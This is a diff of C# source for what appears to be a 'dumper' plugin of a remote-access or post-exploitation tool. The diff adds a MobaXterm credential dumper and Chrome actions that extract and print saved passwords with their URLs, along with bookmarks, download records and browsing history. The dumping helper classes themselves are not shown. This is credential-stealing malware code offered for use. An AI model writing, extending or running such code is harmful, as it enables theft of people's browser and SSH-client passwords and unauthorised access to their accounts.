@@ -24,6 +24,7 @@ namespace Plugin48Dumper
         private List<clsDumper> m_lsModule = new List<clsDumper>()
         {
             new clsChromeDumper(),
+            new clsMobaXtermDumper(),
         };
         private Dictionary<string, clsDumper> m_dicModule = new Dictionary<string, clsDumper>();
 
@@ -73,7 +74,6 @@ namespace Plugin48Dumper
             }
             else if (szCmd == "dump")
             {
-                //string szTarget = args["target"].ToString();
                 object objTarget;
                 object objCount;
                 object objRegex;
@@ -100,14 +100,14 @@ namespace Plugin48Dumper
                 
                 if (szTarget == "chrome")
                 {
+                    var module = (clsChromeDumper)m_dicModule[szTarget];
                     string szAction = lsKey[2];
+
                     clsTools.fnLogInfo("Action => " + szAction);
 
                     if (szAction == "history")
                     {
-                        var module = (clsChromeDumper)m_dicModule[szTarget];
-                        var ls = module.fnlsDumpHistory(nCount);
-
+                        var ls = module.fnlsDumpHistory(nCount, szRegex);
                         foreach (var history in ls)
                         {
                             clsTools.fnLogOK(new string('=', 50));
@@ -118,23 +118,86 @@ namespace Plugin48Dumper
                         }
 
                         clsTools.fnLogOK(new string('=', 50));
-                        clsTools.fnLogOK("\t\t\t\t[Summary]");
+                        clsTools.fnLogOK("[Summary]");
                         clsTools.fnLogOK($"Total: {ls.Count} records");
-
                     }
                     else if (szAction == "cred")
                     {
+                        var ls = module.fnlsDumpCredential(nCount, szRegex);
+                        foreach (var cred in ls)
+                        {
+                            clsTools.fnLogOK(new string('=', 50));
 
+                            clsTools.fnLogOK("[URL]: " + cred.URL);
+                            clsTools.fnLogOK("[Password]: " + cred.Password);
+                            clsTools.fnLogOK("[Creation Date]: " + cred.szCreationDate);
+                            clsTools.fnLogOK("[Last Used]: " + cred.szLastUsed);
+                        }
+
+                        clsTools.fnLogOK(new string('=', 50));
+                        clsTools.fnLogOK("[Summary]");
+                        clsTools.fnLogOK($"Total: {ls.Count} records");
+                    }
+                    else if (szAction == "bookmark")
+                    {
+                        var ls = module.fnlsDumpBookMark(nCount);
+                        foreach (var bookMark in ls)
+                        {
+                            clsTools.fnLogOK(new string('=', 50));
+
+                            clsTools.fnLogOK("[Name]: " + bookMark.Name);
+                            clsTools.fnLogOK("[URL]: " + bookMark.URL);
+                            clsTools.fnLogOK("[Added Date]: " + bookMark.szAddDate);
+                            clsTools.fnLogOK("[Last Used Date]: " + bookMark.szLastUsed);
+                            clsTools.fnLogOK("[Path]: " + bookMark.Path);
+                        }
+
+                        clsTools.fnLogOK(new string('=', 50));
+                        clsTools.fnLogOK("[Summary]");
+                        clsTools.fnLogOK($"Total: {ls.Count} records");
+                    }
+                    else if (szAction == "download")
+                    {
+                        var ls = module.fnlsDumpDownload(nCount, szRegex);
+                        foreach (var download in ls)
+                        {
+                            clsTools.fnLogOK(new string('=', 50));
+
+                            clsTools.fnLogOK("[URL]: " + download.URL);
+                            clsTools.fnLogOK("[FilePath]: " + download.FileName);
+                            clsTools.fnLogOK("[FileName]: " + Path.GetFileName(download.FileName));
+                            clsTools.fnLogOK("[Length]: " + download.Length.ToString() + " bytes");
+                            clsTools.fnLogOK("[Date]: " + download.szDate);
+                        }
+
+                        clsTools.fnLogOK(new string('=', 50));
+                        clsTools.fnLogOK("[Summary]");
+                        clsTools.fnLogOK($"Total: {ls.Count} records");
                     }
                     else
                     {
-                        clsTools.fnLogError("Invalid command: " + szAction);
+                        clsTools.fnLogError("Invalid action: " + szAction);
                     }
+                }
+                else if (szTarget == "xterm")
+                {
+                    var xterm = new clsMobaXtermDumper();
+                    var ls = xterm.fnlsDump();
+
+                    foreach (var cred in ls)
+                    {
+                        clsTools.fnLogInfo(new string('-', 50));
+
+                        clsTools.fnLogInfo(cred.Username);
+                        clsTools.fnLogInfo(cred.Password);
+                    }
+
+                    clsTools.fnLogInfo(new string('-', 50));
                 }
             }
             else
             {
-                
+                throw new Exception("Unknown command: " + szCmd);
             }
 
             return string.Empty;
